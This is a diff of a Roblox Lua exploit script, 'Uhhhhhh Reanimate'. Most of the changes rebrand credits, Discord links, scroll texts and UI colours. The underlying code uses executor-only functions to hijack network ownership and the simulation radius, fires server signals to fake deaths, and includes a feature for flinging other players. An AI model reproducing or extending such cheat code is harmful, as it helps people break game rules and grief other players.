@@ -1,16 +1,11 @@
 --[[
-                                     ___                                       
-                                    (   )                                      
- ___  ___  ___ .---. ___ .-.    .--. | | .-.   .---. ___  ___   .--.    .--.   
-(   )(   )(   / .-, (   )   \  /    \| |/   \ / .-, (   )(   )/  _  \  /    \  
- | |  | |  | (__) ; || ' .-. ;|  .-. |  .-. .(__) ; || |  | |. .' `. ;|  .-. ; 
- | |  | |  | | .'`  ||  / (___|  | | | |  | |  .'`  || |  | || '   | ||  | | | 
- | |  | |  | |/ .'| || |      |  |/  | |  | | / .'| || |  | |_\_`.(___|  |/  | 
- | |  | |  | | /  | || |      |  ' _.| |  | || /  | || |  | (   ). '. |  ' _.' 
- | |  ; '  | ; |  ; || |      |  .'.-| |  | |; |  ; || |  ; '| |  `\ ||  .'.-. 
- ' `-'   `-' ' `-'  || |      '  `-' | |  | |' `-'  |' `-'  /; '._,' ''  `-' / 
-  '.__.'.__.'`.__.'_(___)      `.__.(___)(___`.__.'_. '.__.'  '.___.'  `.__.'  
-       "Whether you think you can or you think you can't, you're right." - Henry Ford
+ ...    :::::        ::        ::        ::        ::        ::        
+ ;;     ;;;;;;       ;;;       ;;;       ;;;       ;;;       ;;;       
+[['     [[[[[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. 
+$$      $$$$$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ 
+88    .d888888   "88o888   "88o888   "88o888   "88o888   "88o888   "88o
+ "YmmMMMM""MMM    YMMMMM    YMMMMM    YMMMMM    YMMMMM    YMMMMM    YMM
+       "DREAMS WILL NEVER COME TRUE UNTIL YOU ACTUALLY MAKE IT."       
 
        Code:    STEVETHEREALONE
                 BoredGal (mostly patches..)
@@ -26,8 +21,8 @@ Thou shalth not steal. Point at this source if you used a snippet here.
 
 if _G.UhhhhhhLoaded then return end
 _G.UhhhhhhLoaded = true
-workspace.Gravity = 0
-local UhhhhhhVersion = "V1.0.9-dd BETA"
+
+local UhhhhhhVersion = "1.0.9 BETA"
 
 local Debris = cloneref(game:GetService("Debris"))
 local CoreGui = cloneref(game:GetService("CoreGui"))
@@ -66,7 +61,7 @@ Util.DeepcopyTable = function(t)
 end
 Util.Notify = function(text)
 	StarterGui:SetCore("SendNotification", {
-		Title = "ware.",
+		Title = "Uhhhhhh",
 		Text = text,
 		Duration = 5
 	})
@@ -467,8 +462,8 @@ do
 				end
 			end
 			if not pcall(function()
-					writefile(fil, game:HttpGet(meta.download_url))
-				end) then skipped += 1 end
+				writefile(fil, game:HttpGet(meta.download_url))
+			end) then skipped += 1 end
 			downloaded += 1
 		end
 		local Downloading = Util.Instance("TextLabel", UIMainFrame)
@@ -658,10 +653,6 @@ UISound.Music.PlaybackSpeed = 1
 
 local MusicPlayer = {}
 MusicPlayer.Database = {
-	{"UhhhhhhReanim/Assets/unknown_keygen.mp3", "Grand Lord - Narcis Dictionary 5b202 Crack"},
-	{"UhhhhhhReanim/Assets/ucf_monday.mp3", "uCF - Monday"},
-	{"UhhhhhhReanim/Assets/dolteddown_sonikc-burble_v2.mp3", "dolteddown - Reanimo!"},
-	{"UhhhhhhReanim/Assets/dolteddown-lague_machine.mp3", "dolteddown - lague machine // SIDE B"},
 	{"UhhhhhhReanim/Assets/dm_afterburner.ft2.mp3", "Dubmood - Afterburner"},
 	{"UhhhhhhReanim/Assets/dm_robotadventure.ft2.mp3", "Dubmood & Zabutom - Robot Adventure Remix"},
 	{"UhhhhhhReanim/Assets/4m_brokenheart.ft2.mp3", "4-Mat - <3 Broken Heart <3"},
@@ -760,12 +751,12 @@ else
 	UISound.Music.Volume = 1
 	UISound.Music.TimePosition = 0
 	local scrolltexts = {
-		"dolteddownskid presents a scrip t                                 ",
+		"stevetherealone presents a script                                 ",
 		"hi guys welcome to my game                                        ",
 		"holy shit where did our friends go?               *gets vc warned*",
 		"greetings to qpmbsjbvt for getting me into reanimation            ",
 		"those who know the place called ajman, dubai, uae                 ",
-		"im larping as steve guys                         PRETTY COOL HUH??",
+		":3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 >:3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3 :3",
 		--"quick intro and quick scrolltext                                                                   hi i like dih",
 		"quick intro        with quick scrolltext         and you will miss the punchline              punchline                did you get the punchline?  ",
 		"meeeooowwwwwwwwww >:3                                          maw",
@@ -788,7 +779,7 @@ else
 		"this is an intro lol                        ",
 		"greetings to myworld for helping with -net less                   ",
 		"Omega-Skidded Immortality Lord Diddy Blud On The Calculator       ",
-		"all UI music credits to dubmood, zabutom, ogge, 4mat and hoster also UCF sob",
+		"all UI music credits to dubmood, zabutom, ogge, 4mat and hoster   ",
 		"heres the triforce                and heres my name                              ",
 		"skids are now taking credit of this entire script, meaning its so good           ",
 		-- nonono i cant advertise that anymore "whenever i see hat reanimation nowadays i check to see if they are collidable    ",
@@ -811,8 +802,8 @@ else
 		AnchorPoint = Vector2.new(1, 0.5),
 	}):Play()
 	local scrolltextratio = scrolltext.Size.X.Offset / scrolltext.Size.Y.Offset
-	local Triforce1 = Util.MakeTriforce(3, Color3.new(1, 1, 1), 4)
-	local Triforce2 = Util.MakeTriforce(3, Color3.new(1, 1, 1), 4)
+	local Triforce1 = Util.MakeTriforce(3, Color3.new(1, 0.7, 0), 4)
+	local Triforce2 = Util.MakeTriforce(3, Color3.new(0.8, 0.4, 0), 4)
 	Triforce1.ZIndex = 2
 	Triforce2.ZIndex = 1
 	Triforce1.Parent = UIMainFrame
@@ -943,6 +934,7 @@ end
 local StylizedObjs = {}
 local function Stylize(obj, options)
 	options = options or {}
+	Util.Instance("UICorner", obj).CornerRadius = UDim.new(0, 5)
 	local Out = Util.Instance("UIStroke", obj)
 	Out.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 	Out.Color = Color3.new(1, 1, 1)
@@ -1068,7 +1060,7 @@ local function SetUITheme(index)
 		-- RGB/Default
 		{},
 		-- ALONE
-		{Fore = Color3.new(1, 1, 1), SndClick = "rbxassetid://128341339664030"},
+		{Fore = Color3.new(1, 1, 1), SndClick = "rbxassetid://81715128969224"},
 		-- Oxide
 		{Fore = Color3.fromRGB(49, 203, 233), Back = Color3.fromRGB(38, 38, 38), Text = Color3.fromRGB(49, 203, 233)},
 		-- Patchma-like
@@ -1150,7 +1142,7 @@ end
 SaveData.UITheme = SaveData.UITheme or 1
 SetUITheme(SaveData.UITheme)
 
-local CracktroFrameText = "Warehause/Uhhhhhh Reanimate" .. UhhhhhhVersion
+local CracktroFrameText = "Uhhhhhh Reanimate V" .. UhhhhhhVersion
 local UIMainWindow, WindowContent do
 	UIMainWindow = Util.Instance("Frame", UIMainFrame)
 	UIMainWindow.Active = true
@@ -1187,7 +1179,7 @@ local UIMainWindow, WindowContent do
 			_registerclicksnd(v)
 		end
 	end)
-
+	
 	local TopBarFrame = Util.Instance("Frame", UIMainWindow)
 	TopBarFrame.Position = UDim2.new(0, 0, 0, 0)
 	TopBarFrame.Size = UDim2.new(1, 0, 0, 30)
@@ -1197,7 +1189,7 @@ local UIMainWindow, WindowContent do
 	TopBarFrame.ClipsDescendants = true
 	TopBarFrame.ZIndex = 1
 	Stylize(TopBarFrame)
-
+	
 	local TopBarText = Util.Instance("TextLabel", TopBarFrame)
 	TopBarText.AnchorPoint = Vector2.new(0, 0.5)
 	TopBarText.Position = UDim2.new(0, 8, 0.5, 0)
@@ -1208,16 +1200,16 @@ local UIMainWindow, WindowContent do
 	TopBarText.TextColor3 = Color3.new(1, 1, 1)
 	TopBarText.TextSize = 20
 	TopBarText.TextXAlignment = Enum.TextXAlignment.Left
-	TopBarText.Text = "Warehause/Uhhhhhh Reanimate | " .. UhhhhhhVersion
+	TopBarText.Text = "Uhhhhhh Reanimate | v" .. UhhhhhhVersion
 	TopBarText.RichText = true
 	RegisterTextLabel(TopBarText)
 	Util.ForceTextSize(TopBarText)
 	if (SaveData.SkipIntro and math.random(2) == 1) or os.date("%m %d") ~= "04 01" then
 		local quotes = {
-			"Ohhhhhh Re-create | " .. UhhhhhhVersion,
+			"Ohhhhhh Re-create | v" .. UhhhhhhVersion,
 			"jumpscare",
 			"you'll never see it coming",
-			Player.Name .. "'s C00lkidd Larping Session",
+			Player.Name .. "'s Uhhhhhh Session",
 			"genesis hat collide releaser admin gui",
 			"Delta Executor",
 			"optimise the optimised",
@@ -1226,19 +1218,19 @@ local UIMainWindow, WindowContent do
 			"wait a minute smth aint right",
 			"gta6 releaser",
 			"HD Admin",
-			"The Return Of STEVE's Reanimate",
+			"The Return Of STEVE's Roserika",
 			"HI",
 			"<font color=\"#00DDFF\">Oxide</font> Version 67",
 			"currentangle v5",
 			"patchma hub by <font color=\"#0000FF\">MyWorld</font>",
 			"Genesis FE with extra steps",
 			"Gugu Gaga",
-			"dolteddown Bullshit Animation Engine",
+			"Half Life 3 Releaser",
 			"hatdrop hub",
 			"uhhhh hub",
 			"Emperyan Reanimate",
 			"<font color=\"#0000FF\">IM BLUE BADA DEE BADA DIE</font>",
-			"Skibidi Reanimate | " .. UhhhhhhVersion,
+			"Delta Reanimate | v" .. UhhhhhhVersion,
 		}
 		if os.date("%m") == "12" and math.random(4) == 1 then
 			quotes = {
@@ -1266,7 +1258,7 @@ local UIMainWindow, WindowContent do
 		end
 		local aprilfools = os.date("%m") == "04 01"
 		if aprilfools then
-			local troll = math.random(4)
+			local troll = math.random(3)
 			if troll == 1 then
 				CracktroFrameText = "Oxide Reanimation V67"
 				quotes = {"<font color=\"#00DDFF\">Oxide</font>   Reanimation"}
@@ -1282,20 +1274,15 @@ local UIMainWindow, WindowContent do
 				quotes = {"<font color=\"#CC11FF\">Genesis V4 - Neptunian V</font>"}
 				SetUITheme(5)
 			end
-			if troll == 4 then
-				CracktroFrameText = "Doltedsteve Ragdoll Permadeath 67676776767767"
-				quotes = {"<font color=\"#CC11FF\">Genesis V4 - Neptunian V</font>"}
-				SetUITheme(5)
-			end
 		end
 		TopBarText.Text = quotes[math.random(1, #quotes)]
 		if not aprilfools then
 			task.delay(2, function()
-				TopBarText.Text = "Warehause/Uhhhhhh Reanimate | " .. UhhhhhhVersion
+				TopBarText.Text = "Uhhhhhh Reanimate | v" .. UhhhhhhVersion
 			end)
 		end
 	end
-
+	
 	local TopBarClose = Util.Instance("TextButton", TopBarFrame)
 	TopBarClose.AnchorPoint = Vector2.new(1, 0)
 	TopBarClose.Position = UDim2.new(1, 0, 0, 0)
@@ -1326,14 +1313,14 @@ local UIMainWindow, WindowContent do
 			TopBarClose.A.B.BackgroundColor3 = val
 		end)
 	end
-
+	
 	WindowContent = Util.Instance("Frame", UIMainWindow)
 	WindowContent.Position = UDim2.new(0, 0, 0, 30)
 	WindowContent.Size = UDim2.new(1, 0, 1, -35)
 	WindowContent.BackgroundTransparency = 1
 	WindowContent.ClipsDescendants = true
 	WindowContent.ZIndex = 0
-
+	
 	local MainWindowClosed = false
 	local MainWindowTweening = false
 	local MainWindowPosOpen = nil
@@ -1388,7 +1375,7 @@ local UIMainWindow, WindowContent do
 		WindowContent.Active = not MainWindowClosed
 		WindowContent.Interactable = not MainWindowClosed
 	end)
-
+	
 	local dragref = nil
 	local offset = Vector2.new(0, 0)
 	TopBarFrame.InputBegan:Connect(function(input)
@@ -1582,15 +1569,15 @@ do -- homepage
 	Glowy.ImageTransparency = 0.7
 	Glowy.ZIndex = -2
 
-	local Triforce = Util.MakeTriforce(3, Color3.new(1, 1, 1), 0)
+	local Triforce = Util.MakeTriforce(3, Color3.new(1, 0.7, 0), 0)
 	Triforce.AnchorPoint = Vector2.new(0.5, 0.5)
 	Triforce.Position = UDim2.new(0.5, 0, 0.5, 0)
 	Triforce.Size = UDim2.new(0, 160, 0, 160)
 	Triforce.Parent = TriforceClip
 
 	local particles = {}
-	local ps = 512
-	local psc = Color3.new(1, 1, 1)
+	local ps = 128
+	local psc = Color3.new(1, 0.9, 0)
 	for i=1, ps do
 		local r = (i / ps) * 2 * math.pi
 		local p = Util.Instance("Frame", CracktroFrame)
@@ -1616,12 +1603,12 @@ do -- homepage
 	text.Position = UDim2.new(0.5, 0, 1, -25)
 	text.ZIndex = 3
 	text.Parent = CracktroFrame
-	local text0 = Util.MakeText("Discord: discord.gg/X2wcVXAgcd")
+	local text0 = Util.MakeText("Discord: discord.gg/NASNUKRBVM")
 	text0.AnchorPoint = Vector2.new(0.5, 1)
 	text0.Position = UDim2.new(0.5, 0, 1, -17)
 	text0.ZIndex = 3
 	text0.Parent = CracktroFrame
-	local text1 = Util.MakeText("Made by dolted:" .. (math.random() < 0.333 and "3" or (math.random() < 0.5 and "D" or "P")))
+	local text1 = Util.MakeText("Made by STEVETHEREALONE :" .. (math.random() < 0.333 and "3" or (math.random() < 0.5 and "D" or "P")))
 	text1.AnchorPoint = Vector2.new(0.5, 1)
 	text1.Position = UDim2.new(0.5, 0, 1, -17)
 	text1.ZIndex = 3
@@ -1641,7 +1628,7 @@ do -- homepage
 		"A great " .. os.date("%A") .. " today, eh?",
 		"Hello, " .. Player.Name .. ".",
 		"What makes you play at " .. os.date("%I %p") .. "?",
-		"You are going to love Uhhhhhh, I ust know it.",
+		"You are going to love Uhhhhhh, I just know it.",
 		"This script is very \"verbose\".",
 		"Written mostly on a mobile phone.",
 		"I am pretty new in this community! :D",
@@ -2833,7 +2820,7 @@ task.spawn(function()
 			"Believe me friend, its fuckingly fast, you don't ev",
 		},
 		{
-			"Uhhhhhh  https://discord.gg/X2wcVXAgcd  Uhhhhhh",
+			"Uhhhhhh  https://discord.gg/NASNUKRBVM  Uhhhhhh",
 			"Uhhhhhh Uhhhhhh Uhhhhhh Uhhhhhh STEVETHEREALONE",
 			"Uhhhhhh Uhhhhhh Uhhhhhh STEVETHEREALONE Uhhhhhh",
 			"Uhhhhhh Uhhhhhh STEVETHEREALONE Uhhhhhh Uhhhhhh",
@@ -3310,7 +3297,7 @@ local function CreateHumanoidCharacter()
 	tshirt.Name = "triforce"
 	tshirt.Texture = "rbxassetid://101055520647223"
 	tshirt.Color3 = Color3.new(1, 1, 1)
-
+	
 	Util.LinkDestroyI2C(char, RunService.PreRender:Connect(function()
 		face.Transparency = Util.GetTransparency(head)
 		tshirt.Transparency = Util.GetTransparency(torso)
@@ -3331,15 +3318,15 @@ SaveData.NoSmoothCam = not not SaveData.NoSmoothCam
 SaveData.FirstPersonBody = not not SaveData.FirstPersonBody
 SaveData.NoSeatSitEnabled = not SaveData.NoSeatSitEnabled
 SaveData.ToolGrabEnabled = not not SaveData.ToolGrabEnabled
-SaveData.ScaleGravityEnabled = true
+SaveData.ScaleGravityEnabled = not not SaveData.ScaleGravityEnabled
 SaveData.CharacterScale = SaveData.CharacterScale or 1
 SaveData.P2PCollision = not not SaveData.P2PCollision
 SaveData.ShiftlockDisabled = not not SaveData.ShiftlockDisabled
 SaveData.NoLoadAnimationHook = not not SaveData.NoLoadAnimationHook
 SaveData.NoPhysicsRepRootPart = not not SaveData.NoPhysicsRepRootPart
 SaveData.NetlessVelocity = SaveData.NetlessVelocity or 25.01
-SaveData.UsePatchmaLikeNetless = not not SaveData.UsePatchmaLikeNetless or true
-SaveData.UseAngularVelocity = not not SaveData.UseAngularVelocity or true
+SaveData.UsePatchmaLikeNetless = not not SaveData.UsePatchmaLikeNetless
+SaveData.UseAngularVelocity = not not SaveData.UseAngularVelocity
 SaveData.PatchmaVoidFloat = not not SaveData.PatchmaVoidFloat
 SaveData.PlaceholderTransparency = SaveData.PlaceholderTransparency or 0.5
 
@@ -3348,15 +3335,7 @@ local _G_Uhhhhhh = {}
 -- jjsloit didnt have _G, just making sure if 100% unc execs dont have this even
 pcall(function() _G.Uhhhhhh = _G_Uhhhhhh end)
 _G_Uhhhhhh.BindableEvent = Util.Instance("BindableEvent") -- not used 3:
-ws=cloneref(workspace)
-p=cloneref(game:GetService("Players")).LocalPlayer
--- stupid stuff that steve didnt add just to be sure
-pcall(function()
-	sethiddenproperty(ws, "SignalBehavior", "Immediate")
-end)
-pcall(function()
-	settings().Network.IncomingReplicationLag = -100
-end)
+
 local Reanimate = {
 	Current = nil,
 	Character = nil,
@@ -4180,7 +4159,7 @@ Reanimate.CreateCharacter = function(InitCFrame)
 		local gravaff = not not table.find(fallingStates, RCHumanoidState)
 		if gravaff then
 			if Reanimate.ScaleGravity and not RCRootPart:IsGrounded() then
-				force += Vector3.new(0, -196.84 * (scale), 0) * RCRootPart.AssemblyMass
+				force += Vector3.new(0, -workspace.Gravity * (scale - 1), 0) * RCRootPart.AssemblyMass
 			end
 		end
 		if LastJump ~= CJump then
@@ -4967,9 +4946,8 @@ end
 
 local HatReanimator = {}
 HatReanimator.Name = "Hats"
-SaveData.UITheme = SaveData.UITheme or "ALONE"
 SaveData.Reanimator.HatsCollide = not not SaveData.Reanimator.HatsCollide
-SaveData.Reanimator.HatsCollideMethod = SaveData.Reanimator.HatsCollideMethod or 8
+SaveData.Reanimator.HatsCollideMethod = SaveData.Reanimator.HatsCollideMethod or 6
 SaveData.Reanimator.IWantAllHats = not not SaveData.Reanimator.IWantAllHats
 SaveData.Reanimator.IWantHatCollide = SaveData.Reanimator.IWantHatCollide or 3
 SaveData.Reanimator.HatsPatchmahub = not not SaveData.Reanimator.HatsPatchmahub
@@ -4978,8 +4956,7 @@ SaveData.Reanimator.HatsFling = not not SaveData.Reanimator.HatsFling
 SaveData.Reanimator.HatsSpin = not not SaveData.Reanimator.HatsSpin
 SaveData.Reanimator.HatsFlingMethod = SaveData.Reanimator.HatsFlingMethod or 1
 SaveData.Reanimator.NoToolHolding = not not SaveData.Reanimator.NoToolHolding
-SaveData.Reanimator.HatsToolAnim = SaveData.Reanimator.HatsToolAnim or 1
-SaveData.Reanimator.RagdollPDAssist = SaveData.Reanimator.RagdollPDAssist or false
+SaveData.Reanimator.HatsToolAnim = SaveData.Reanimator.HatsToolAnim or 0
 HatReanimator.HatCollide = SaveData.Reanimator.HatsCollide
 HatReanimator.HatCollideMethod = SaveData.Reanimator.HatsCollideMethod
 -- 0 - shownape's method
@@ -5010,8 +4987,6 @@ HatReanimator.ToolHolding = not SaveData.Reanimator.NoToolHolding
 HatReanimator.ToolAnimMethod = SaveData.Reanimator.HatsToolAnim
 -- 0 - nothing
 -- 1 - sword
-HatReanimator.RagdollPDAssist = SaveData.Reanimator.RagdollPDAssist or false
--- you would want to use this for ragdoll games because ragdoll can reintroduce permadeath btw
 HatReanimator.UseNaNFling = true
 HatReanimator.HasPermadeath = false
 HatReanimator.HasHatCollide = false
@@ -5080,16 +5055,11 @@ function HatReanimator.Fling(target, duration)
 end
 HatReanimator.DontFireCharAddOnThisChar = nil
 function HatReanimator.Config(parent)
-	UI.CreateText(parent, "permadeath is being serviced on, give me a couple days", 10, Enum.TextXAlignment.Center)
+	UI.CreateText(parent, "permadeath is patched, enable this switch if you want to", 10, Enum.TextXAlignment.Center)
 	UI.CreateSwitch(parent, "Permadeath", HatReanimator.Permadeath).Changed:Connect(function(val)
 		HatReanimator.Permadeath = val
 		SaveData.Reanimator.HatsPatchmahub = not val
 	end)
-	UI.CreateSwitch(parent, "Ragdoll PD Assist", HatReanimator.RagdollPDAssist).Changed:Connect(function(val)
-		HatReanimator.RagdollPDAssist = val
-		SaveData.Reanimator.RagdollPDAssist = val
-	end)
-	UI.CreateText(parent, "^^this can fix permadeath but it only works in ragdoll games sadly (because of RequiresNeck)^^", 10, Enum.TextXAlignment.Center)
 	UI.CreateDropdown(parent, "respawntp", {
 		"The Void",
 		"Behind ReanimCharacter",
@@ -5113,7 +5083,7 @@ function HatReanimator.Config(parent)
 		"6 - STEVE's method V2 (kinda stable)",
 		"7 - 6 but further from void (gl getting hatdrop)",
 		"8 - STEVE's method V3 (most stable)",
-		"9 - experimental (you should try it out)",
+		"9 - experimental do not use",
 	}, HatReanimator.HatCollideMethod + 1).Changed:Connect(function(val)
 		HatReanimator.HatCollideMethod = val - 1
 		SaveData.Reanimator.HatsCollideMethod = val - 1
@@ -5181,11 +5151,7 @@ function HatReanimator.Config(parent)
 	end)
 	UI.CreateText(parent, "^^^ if ur rig built wrong or u switched to a new rig ^^^\nthis button is for you", 10, Enum.TextXAlignment.Center)
 	UI.CreateButton(parent, "Respawn", 20).Activated:Connect(function()
-		Player.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
-		Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-		pcall(replicatesignal, Player.Kill)
-		-- steve what is taking you so long to add this, you commented cdsb respawn out and now you cant respawn and yknow this is the fix
-		-- i mean this wouldve been good when cdsb permadeath was a thing too dude
+		--HatReanimator.Status.Permadeath = "Fired CDSB Signal!"
 	end)
 end
 HatReanimator.GetHatMap = function() end
@@ -5817,7 +5783,7 @@ function HatReanimator.Start()
 	HatReanimator.RebuildRequired = true
 	HatReanimator.HatMapSummary = "(no hat map yet...)"
 	table.clear(HatReanimator.FlingTargets)
-
+	
 	local lastsimradchange = 0
 	local function SetSimulationRadius()
 		local function setsimrad(plr, radius)
@@ -5837,8 +5803,8 @@ function HatReanimator.Start()
 		local r = #Players:GetPlayers() * 1000
 		setsimrad(Player, r)
 		--if os.clock() > lastsimradchange then
-		--lastsimradchange = os.clock() + 1
-		--pcall(replicatesignal, Player.SimulationRadiusChanged, r)
+			--lastsimradchange = os.clock() + 1
+			--pcall(replicatesignal, Player.SimulationRadiusChanged, r)
 		--end
 		--[[pcall(setsimulationradius, r, r)
 		pcall(function()
@@ -5850,7 +5816,7 @@ function HatReanimator.Start()
 	local function IsNetworkOwner(part)
 		return part.ReceiveAge == 0
 	end
-
+	
 	local BackendAccoutrementState = {
 		None = 0,
 		HasHandle = 1,
@@ -6488,15 +6454,8 @@ function HatReanimator.Start()
 		local cdsbeffect = os.clock()
 		local cdsbtime = os.clock()
 		if perma then
-			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
-			Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-			pcall(firesignal, Humanoid.StateEChanged, Enum.HumanoidStateType.Swimming, nil)
-			pcall(firesignal, Humanoid.StateEnabledChanged, Enum.HumanoidStateType.Dead, false) -- im trine bro im trine
-			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-			Humanoid.EvaluateStateMachine = false
-			Humanoid.RequiresNeck = false
-			pcall(firesignal, Humanoid.RequiresNeck, false)
-			HatReanimator.Status.Permadeath = "Enabled Swimstate."
+			--replicatesignal(Player.ConnectDiedSignalBackend)
+			HatReanimator.Status.Permadeath = "Fired CDSB Signal."
 			cdsbeffect += Players.RespawnTime
 		end
 		HatReanimator.Status.RespawnFling = "Flinging targets..."
@@ -6613,8 +6572,16 @@ function HatReanimator.Start()
 						handle.RotVelocity = Vector3.new(0, 0, 0)
 					end
 				end))
-				local w = handle:FindFirstChild("AccessoryWeld")
-				if w and w:IsA("Weld") then w:Destroy() end
+				for _,v in handle:GetChildren() do
+					if v:IsA("JointInstance") then v:Destroy() end
+					if v:IsA("Constraint") then v.Enabled = false end
+					if v:IsA("Attachment") then
+						v.Archivable = true
+						local w = v:Clone()
+						v:Destroy()
+						w.Parent = handle
+					end
+				end
 				handle:SetAttribute("_Uhhhhhh_HasCollide", false)
 			end
 		end
@@ -6631,19 +6598,9 @@ function HatReanimator.Start()
 		pcall(replicatesignal, Humanoid.ServerBreakJoints)
 		Humanoid.EvaluateStateMachine = true
 		Humanoid.BreakJointsOnDeath = true
-		if HatReanimator.RagdollPDAssist == false then
-			Humanoid.Health = -math.huge
-			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-			Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-			replicatesignal(Player.Kill)
-		end
-		if HatReanimator.RagdollPDAssist == true then
-			pcall(replicatesignal, Humanoid.ServerBreakJoints)
-			Player.Character:BreakJoints()
-			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
-			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-			Humanoid:ChangeState(Enum.HumanoidStateType.Climbing)
-		end
+		Humanoid.Health = 0
+		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+		Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
 		readystate = 3
 		HatReanimator.Status.ReanimState = "Reanimate State: 3"
 		IsRespawning = false
@@ -6727,6 +6684,8 @@ function HatReanimator.Start()
 		local h = Player.Character:FindFirstChildOfClass("Humanoid")
 		if h and h.RootPart then
 			InitCFrame = h.RootPart.CFrame
+			pcall(function() Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) end)
+			pcall(function() Player.Character.Humanoid.Health = 0 end)
 			pcall(replicatesignal, Player.Character.Humanoid.ServerBreakJoints)
 			--pcall(replicatesignal, Player.ConnectDiedSignalBackend)
 			Player.Character.DescendantAdded:Connect(CharOnDesc)
@@ -7267,6 +7226,10 @@ do
 		Reanimate.ToolGrab = val
 		SaveData.ToolGrabEnabled = val
 	end)
+	UI.CreateSwitch(MainPage, "Apply Scale to Gravity", Reanimate.ScaleGravity).Changed:Connect(function(val)
+		Reanimate.ScaleGravity = val
+		SaveData.ScaleGravityEnabled = val
+	end)
 	UI.CreateSwitch(MainPage, "Void Float", Reanimate.PatchmaVoidFloat).Changed:Connect(function(val)
 		Reanimate.PatchmaVoidFloat = val
 		SaveData.PatchmaVoidFloat = val
@@ -7295,7 +7258,7 @@ do
 	end)
 	local CharacterScaleSlider = UI.CreateSlider(MainPage, "Character Scale", Reanimate.CharacterScale, 0.5, 5, 0.5)
 	CharacterScaleSlider.Changed:Connect(function(val)
-		val = math.clamp(val, 0.001, math.huge)
+		val = math.clamp(val, 0.001, 20)
 		CharacterScaleSlider.Value = val
 		Reanimate.CharacterScale = val
 		SaveData.CharacterScale = val
@@ -8611,104 +8574,104 @@ task.spawn(function()
 	local errorsandwarnings = {}
 	local currenterrorid = 1
 	while true do local dt = RunService.Heartbeat:Wait() xpcall(function(dt)
-			local ReanimCharacter = Reanimate.Character
-			SaveData.MovesetIndex = MovementStyleIndex
-			if ReanimCharacter then
-				if _oldcharacterreference ~= ReanimCharacter then
-					SetOverrideMovesetMusic(nil)
-					SetOverrideDanceMusic(nil)
-					if CurrentMovementStyle then
-						pcall(CurrentMovementStyle.Destroy, nil)
-						CurrentMovementStyle = nil
-					end
-					if _CurrentDance then
-						pcall(_CurrentDance.Destroy, nil)
-						_CurrentDance = nil
-					end
-					_MovementStyleIndex = nil
-				end
-				if MovementStyleIndex ~= _MovementStyleIndex then
-					if CurrentMovementStyle then
-						CurrentMovementStyle.Destroy(ReanimCharacter)
-						CurrentMovementStyle = nil
-					end
-					_MovementStyleIndex = MovementStyleIndex
-					CurrentMovementStyle = MovementStyles[MovementStyleIndex]
-					SetOverrideMovesetMusic(nil)
-					if ReanimCharacter:GetAttribute("MovementInit") then
-						Reanimate.CreateCharacter()
-						ReanimCharacter = Reanimate.Character
-					end
-				end
-				if CurrentMovementStyle then
-					if ReanimCharacter:GetAttribute("MovementInit") then
-						CurrentMovementStyle.Update(dt, ReanimCharacter)
-						if CurrentDance ~= _CurrentDance then
-							if _CurrentDance then
-								pcall(_CurrentDance.Destroy, ReanimCharacter)
-							end
-							_CurrentDance = CurrentDance
-							ReanimCharacter:SetAttribute("IsDancing", nil)
-							ReanimCharacter:SetAttribute("DanceInternalName", nil)
-							SetOverrideDanceMusic(nil)
-						end
-						if _CurrentDance then
-							if ReanimCharacter:GetAttribute("IsDancing") then
-								_CurrentDance.Update(dt, ReanimCharacter)
-							else
-								if AssetEnsure(_CurrentDance.Assets) then
-									ReanimCharacter:SetAttribute("IsDancing", true)
-									ReanimCharacter:SetAttribute("DanceInternalName", _CurrentDance.InternalName)
-									_CurrentDance.Init(ReanimCharacter)
-								else
-									SetOverrideDanceMusic(nil)
-								end
-							end
-						end
-					else
-						HatReanimator.HatWeldOverride = {}
-						if AssetEnsure(CurrentMovementStyle.Assets) then
-							ReanimCharacter:SetAttribute("MovementInit", true)
-							ReanimCharacter:SetAttribute("MovesetInternalName", CurrentMovementStyle.InternalName)
-							table.clear(HatReanimator.HatCFrameOverride)
-							CurrentMovementStyle.Init(ReanimCharacter)
-						else
-							SetOverrideMovesetMusic(nil)
-						end
-					end
-				else
-					ReanimCharacter:SetAttribute("MovementInit", nil)
-					_MovementStyleIndex = nil
-				end
-			else
-				CurrentDance = nil
-				_MovementStyleIndex = nil
+		local ReanimCharacter = Reanimate.Character
+		SaveData.MovesetIndex = MovementStyleIndex
+		if ReanimCharacter then
+			if _oldcharacterreference ~= ReanimCharacter then
 				SetOverrideMovesetMusic(nil)
 				SetOverrideDanceMusic(nil)
 				if CurrentMovementStyle then
-					CurrentMovementStyle.Destroy(nil)
+					pcall(CurrentMovementStyle.Destroy, nil)
 					CurrentMovementStyle = nil
 				end
 				if _CurrentDance then
-					_CurrentDance.Destroy(nil)
+					pcall(_CurrentDance.Destroy, nil)
 					_CurrentDance = nil
 				end
+				_MovementStyleIndex = nil
 			end
-			_oldcharacterreference = ReanimCharacter
-		end, function(m)
-			m = debug.traceback("ANIMLOOP :: " .. m)
-			local id = errorsandwarnings[m]
-			if not id then
-				errorsandwarnings[m] = {currenterrorid, 0}
-				currenterrorid += 1
-				warn("ERROR #" .. errorsandwarnings[m][1] .. ": " .. m)
-			else
-				id[2] += 1
-				if id[2] <= 8192 and math.sqrt(id[2]) % 1 == 0 then
-					warn("ERROR #" .. id[1] .. " repeated " .. id[2] .. " times")
+			if MovementStyleIndex ~= _MovementStyleIndex then
+				if CurrentMovementStyle then
+					CurrentMovementStyle.Destroy(ReanimCharacter)
+					CurrentMovementStyle = nil
+				end
